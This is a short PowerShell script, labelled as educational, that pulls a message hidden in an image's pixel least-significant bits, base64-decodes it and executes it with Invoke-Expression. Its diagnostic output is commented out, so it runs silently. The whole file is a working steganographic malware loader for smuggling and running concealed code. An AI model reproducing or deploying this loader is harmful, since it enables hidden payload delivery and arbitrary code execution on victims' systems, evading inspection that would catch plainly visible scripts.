# For educational purposes only. Use responsibly and ethically.
param(
    [Parameter(Position=0, Mandatory=$true)]
    [string]$InputImage
)

function BytesToBits([byte[]]$data) {
    return ($data | ForEach-Object { [Convert]::ToString($_,2).PadLeft(8,'0') }) -join ''
}

function BitsToBytes([string]$bits) {
    $bytes = @()
    for ($i=0; $i -lt $bits.Length; $i+=8) {
        $bytes += [Convert]::ToByte($bits.Substring($i,8),2)
    }
    return ,$bytes
}

function IntToBigEndianBytes([int]$value) {
    $bytes = [BitConverter]::GetBytes($value)
    [Array]::Reverse($bytes)
    return $bytes
}

function BigEndianBytesToInt([byte[]]$bytes) {
    [Array]::Reverse($bytes)
    return [BitConverter]::ToInt32($bytes, 0)
}

function Extract-MessageFromImage($imgPath) {
    Add-Type -AssemblyName System.Drawing
    $bmp = [System.Drawing.Bitmap]::FromFile($imgPath)
    $width = $bmp.Width
    $height = $bmp.Height

    # Nejprve načti 32 bitů pro délku zprávy
    $bits = ""
    $bitCount = 0
    $headerBitsNeeded = 32
    $msgLen = $null
    $totalBitsNeeded = $null
    $done = $false

    for ($y=0; $y -lt $height -and -not $done; $y++) {
        for ($x=0; $x -lt $width -and -not $done; $x++) {
            $pixel = $bmp.GetPixel($x, $y)
            foreach ($color in @($pixel.R, $pixel.G, $pixel.B)) {
                $bits += ($color -band 1)
                $bitCount++
                if ($bitCount -eq $headerBitsNeeded -and -not $msgLen) {
                    $headerBytes = BitsToBytes $bits
                    $msgLen = BigEndianBytesToInt $headerBytes
                    $totalBitsNeeded = $headerBitsNeeded + $msgLen * 8
                }
                if ($totalBitsNeeded -and $bitCount -ge $totalBitsNeeded) {
                    $done = $true
                    break
                }
            }
        }
    }
    $bmp.Dispose()

    if (-not $msgLen) {
        # Write-Host "Chyba: Nepodarilo se precist delku zpravy."
        return
    }
    if ($bits.Length -lt ($headerBitsNeeded + $msgLen*8)) {
        # Write-Host "Chyba: V obrazku neni dost dat pro zpravu delky $msgLen bajtu."
        return
    }
    $dataBits = $bits.Substring($headerBitsNeeded, $msgLen*8)
    $payload = BitsToBytes $dataBits
    $base64 = [System.Text.Encoding]::UTF8.GetString($payload)
    $text = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64))
    # Write-Host "Nalezena zprava (po base64 decode): $text"
    Invoke-Expression $text
}

Extract-MessageFromImage $InputImage
